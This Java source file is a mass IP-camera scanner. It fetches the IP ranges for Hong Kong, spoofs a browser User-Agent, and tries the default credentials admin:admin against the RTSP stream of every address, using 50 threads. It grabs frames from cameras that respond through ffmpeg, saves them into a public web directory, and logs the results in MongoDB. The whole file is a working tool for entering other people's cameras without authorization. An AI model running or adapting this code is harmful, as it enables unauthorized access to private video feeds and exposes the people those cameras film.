import com.mongodb.MongoClient;
import com.mongodb.client.MongoCollection;
import com.mongodb.client.MongoDatabase;
import com.mongodb.client.model.UpdateOptions;
import org.bson.Document;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.Callable;
import java.net.URL;
import java.net.URLConnection;
import java.net.InetAddress;
import java.nio.charset.Charset;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import static com.mongodb.client.model.Filters.*;

public class rtsp {

	public static void main(String[] args) {

		// connect to the local database server
		MongoClient mongoClient = new MongoClient();		

		// get handle to "ipcam" database
		MongoDatabase database = mongoClient.getDatabase("ipcam");

		// get a handle to the "capture_lsit" collection
		MongoCollection<Document> collection = database.getCollection("capture_list");

        // create thread pool
        Integer threadSize = 50;
		ExecutorService executor = Executors.newFixedThreadPool(threadSize);

		// create result list
		Future[] futures = new Future[threadSize];

        // load URL
        try {
	        URL url = new URL("http://services.ce3c.be/ciprg/?countrys=Hong+Kong&format=by+input&format2=%7Bstartip%7D%2C%7Bendip%7D%0D%0A");
			URLConnection spoof = url.openConnection();

			// spoof the connection so we look like a web browser
			spoof.setRequestProperty( "User-Agent", "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0;    H010818)" );

			BufferedReader in = new BufferedReader(new InputStreamReader(spoof.getInputStream()));

			String strLine = "";
			String startAddr = "";
			String endAddr = "";
			String ip = "";
			String output = "";
			Long startInt, endInt;
			InetAddress bar, foo;
			boolean busy;

			// loop through every line in the source
			while ((strLine = in.readLine()) != null){

				startAddr = strLine.substring(0,strLine.indexOf(','));
				endAddr = strLine.substring(strLine.indexOf(',')+1);

				System.out.println(startAddr + " " + endAddr);

				// Convert from an IPv4 address to an integer
				startInt = ipToLong(startAddr);
				endInt = ipToLong(endAddr);

				for(Long l = startInt; l < endInt; l++) {

					// Convert from integer to an IPv4 address
					ip = longToIp(l);

					System.out.println(ip);

					// Set the busy
					busy = true;

					//Find free thread
					while(busy) {
					
						for(int i = 1; i < threadSize; i++) {
						
							if(futures[i] == null) {

								//System.out.println("Free Thread : " + i);

								futures[i] = executor.submit(new rtspTask(ip));

								busy = false;

								i = threadSize;

							} else {
								if(futures[i].isDone()) {

									//System.out.println("Done Thread : " + i);

									//Get thread output, link,result
									output = (String)futures[i].get();

									//Find and update Database
									Date now = new Date();
									SimpleDateFormat sdFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");								
									Document doc = new Document("$set", new Document("ip",l)
												.append("link",output.substring(0,output.indexOf('~')))
												.append("capture_timestamp",sdFormat.format(now))
												.append("capture_result",output.substring(output.indexOf('~')+1)));

									collection.updateOne(eq("ip",l),doc,new UpdateOptions().upsert(true));

									futures[i] = executor.submit(new rtspTask(ip));

									busy = false;

									i = threadSize;

								}

							}

						}

						Thread.sleep(1);

					}

				} 	

			}        	
        } catch (Exception e) {
        	System.out.println(e.getMessage());
        }

		executor.shutdown();

	}

	public static long ipToLong(String ipAddress) {

		String[] ipAddressInArray = ipAddress.split("\\.");

		long result = 0;
		for (int i = 0; i < ipAddressInArray.length; i++) {

			int power = 3 - i;
			int ip = Integer.parseInt(ipAddressInArray[i]);
			result += ip * Math.pow(256, power);

		}

		return result;
	}	

	public static String longToIp(long ip) {

		StringBuilder result = new StringBuilder(15);

		for (int i = 0; i < 4; i++) {

			result.insert(0,Long.toString(ip & 0xff));

			if (i < 3) {
				result.insert(0,'.');
			}

			ip = ip >> 8;
		}

		return result.toString();
	}	

}

class rtspTask implements Callable<String> {

	private String ip;

	public rtspTask (String ip) {

		this.ip = ip;	

	}		

	@Override
	public String call() throws Exception{

		//System.out.println(Thread.currentThread().getName() + " Begins Work  " + id);
		//Process p;
		//StringBuffer output = new StringBuffer();

		String user, pw, req, link, rtspCmd;
		rtspCmd = "";
		user = "admin";
		pw = "admin";
		req = "11";

		link = "rtsp://"+user+":"+pw+"@"+ip+"/"+req;
		rtspCmd = "ffmpeg -stimeout 1500000 -i "
			+link+" "
			+"-f image2 -vframes 1 -y "
			+"/var/www/html/ipcam/pic/"+ip+".jpeg 2>&1";

		Process processDuration = new ProcessBuilder("ffmpeg","-stimeout","1500000","-i",link,"-f","image2","-vframes","1","-y","/var/www/html/ipcam/pic/"+ip+".jpeg","2>&1").redirectErrorStream(true).start();
		StringBuilder strBuild = new StringBuilder();
		try (BufferedReader processOutputReader = new BufferedReader(new InputStreamReader(processDuration.getInputStream(), Charset.defaultCharset()));) {
		    String line;
		    while ((line = processOutputReader.readLine()) != null) {
		        strBuild.append(line + System.lineSeparator());
		    }
		    processDuration.waitFor();
		}

		return link + "~" + checkResult(strBuild.toString());
	}

	public String checkResult(String output) {
		String result = "";
		if(output.indexOf("Connection timed out") > -1) {
			result = "Connection timeout";		//Host offline	
		} else if(output.indexOf("Connection refused") > -1) {
			result = "Connection refused";		//Host online but no RSTP
		} else if(output.indexOf("400 Bad Request") > -1) {
			result = "400 Bad Request";			//RTSP ok but bad request	
		} else if(output.indexOf("401 Unauthorized") > -1) {
			result = "401 Unauthorized";			//RTSP & request ok but incorrect password
		} else if(output.indexOf("Invalid data found") > -1) {
			result = "Invalid data found"; 		//Invalid data found
		} else if(output.indexOf("Output #0, image2, to") > -1) {
			result = "Success"; 					//Connect success
		}
		return result;
	}

}